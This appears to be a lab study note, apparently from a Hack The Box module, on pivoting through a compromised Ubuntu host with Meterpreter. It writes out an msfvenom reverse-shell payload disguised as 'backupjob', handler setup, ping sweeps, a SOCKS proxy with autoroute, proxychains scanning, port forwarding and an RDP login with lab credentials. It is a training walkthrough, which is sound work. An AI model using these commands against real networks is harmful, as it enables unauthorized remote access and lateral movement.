The first step is to gain a Meterpreter shell on the victim machine.

#### Creating Payload for Ubuntu Pivot Host

	AstraX01@htb[/htb]$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.18 -f elf -o backupjob LPORT=8080

#### Configuring & Starting the multi/handler

	msf6 > use exploit/multi/handler 
	
	[*] Using configured payload generic/shell_reverse_tcp 
	msf6 exploit(multi/handler) > set lhost 0.0.0.0 
	lhost => 0.0.0.0 
	msf6 exploit(multi/handler) > set lport 8080 
	lport => 8080 
	msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp 
	payload => linux/x64/meterpreter/reverse_tcp 
	msf6 exploit(multi/handler) > run 
	
	[*] Started reverse TCP handler on 0.0.0.0:8080

#### Executing the Payload on the Pivot Host

We can copy the `backupjob` binary file to the Ubuntu pivot host `over SSH` and execute it to gain a Meterpreter session.

	ubuntu@WebServer:~$ ls 
	backupjob 
	ubuntu@WebServer:~$ chmod +x backupjob 
	ubuntu@WebServer:~$ ./backupjob

#### Meterpreter Session Establishment

We need to make sure the Meterpreter session is successfully established upon executing the payload.

	meterpreter > pwd 
	
	/home/ubuntu

We know that the Windows target is on the 172.16.5.0/23 network. So assuming that the firewall on the Windows target is allowing ICMP requests, we would want to perform a ping sweep on this network. We can do that using Meterpreter with the `ping_sweep` module, which will generate the ICMP traffic from the Ubuntu host to the network `172.16.5.0/23`.

#### Ping Sweep

	meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23

#### Ping Sweep For Loop on Linux Pivot Hosts

	for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done

#### Ping Sweep For Loop Using CMD

	for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"

#### Ping Sweep Using PowerShell

	1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.16.5.$($_) -quiet)"}

Try Ping sweep atleast two times . 

#### Configuring MSF's SOCKS Proxy

Firewalls may block ping (ICMP), so a TCP scan may be needed instead.

To scan the `internal(172.16.5.0/23)` network:

- Use Metasploit’s `socks_proxy` module to create a **SOCKS4a proxy** on port 9050.
- This routes all traffic through the existing **Meterpreter session**, acting as a pivot into the target network.
- Now, tools like Nmap can be directed through this proxy to scan using TCP instead of ICMP.

S

	msf6 > use auxiliary/server/socks_proxy

	msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
	SRVPORT => 9050
	msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
	SRVHOST => 0.0.0.0
	msf6 auxiliary(server/socks_proxy) > set version 4a
	version => 4a
	msf6 auxiliary(server/socks_proxy) > run
	[*] Auxiliary module running as background job 0.
	
	[*] Starting the SOCKS proxy server

#### Confirming Proxy Server is Running

	msf6 auxiliary(server/socks_proxy) > jobs

#### Adding a Line to proxychains.conf if Needed

	socks4 127.0.0.1 9050

Note: Depending on the version the SOCKS server is running, we may occasionally need to changes socks4 to socks5 in proxychains.conf.

#### Creating Routes with AutoRoute

Finally, we need to tell our socks_proxy module to route all the traffic via our Meterpreter session.

	msf6 > use post/multi/manage/autoroute

	msf6 post(multi/manage/autoroute) > set SESSION 1
	SESSION => 1
	msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
	SUBNET => 172.16.5.0
	msf6 post(multi/manage/autoroute) > run

It is also possible to add routes with autoroute by running autoroute from the Meterpreter session.

	meterpreter > run autoroute -s 172.16.5.0/23

#### Listing Active Routes with AutoRoute

	meterpreter > run autoroute -p

#### Testing Proxy & Routing Functionality

	AstraX01@htb[/htb]$ proxychains nmap 172.16.5.19 -p3389 -sT -v -Pn

---

## Port Forwarding

Port forwarding can also be accomplished using Meterpreter's `portfwd` module. We can enable a listener on our attack host and request Meterpreter to via our Meterpreter session to a remote host on the 172.16.5.0/23 network.

#### Creating Local TCP Relay

	meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19

he above command requests the Meterpreter session to start a listener on our attack host's local port (`-l`) `3300` and forward all the packets to the remote (`-r`) Windows server `172.16.5.19` on `3389` port (`-p`) via our Meterpreter session. Now, if we execute xfreerdp on our localhost:3300, we will be able to create a remote desktop session.

#### Connecting to Windows Target through localhost

	AstraX01@htb[/htb]$ xfreerdp /v:localhost:3300 /u:victor /p:pass@123

---

## Meterpreter Reverse Port Forwarding

#### Reverse Port Forwarding Rules

	meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18

#### Configuring & Starting multi/handler

	meterpreter > bg 
	
	[*] Backgrounding session 1... 
	msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp 
	payload => windows/x64/meterpreter/reverse_tcp 
	msf6 exploit(multi/handler) > set LPORT 8081 
	LPORT => 8081 
	msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
	LHOST => 0.0.0.0 
	msf6 exploit(multi/handler) > run 
	
	[*] Started reverse TCP handler on 0.0.0.0:8081

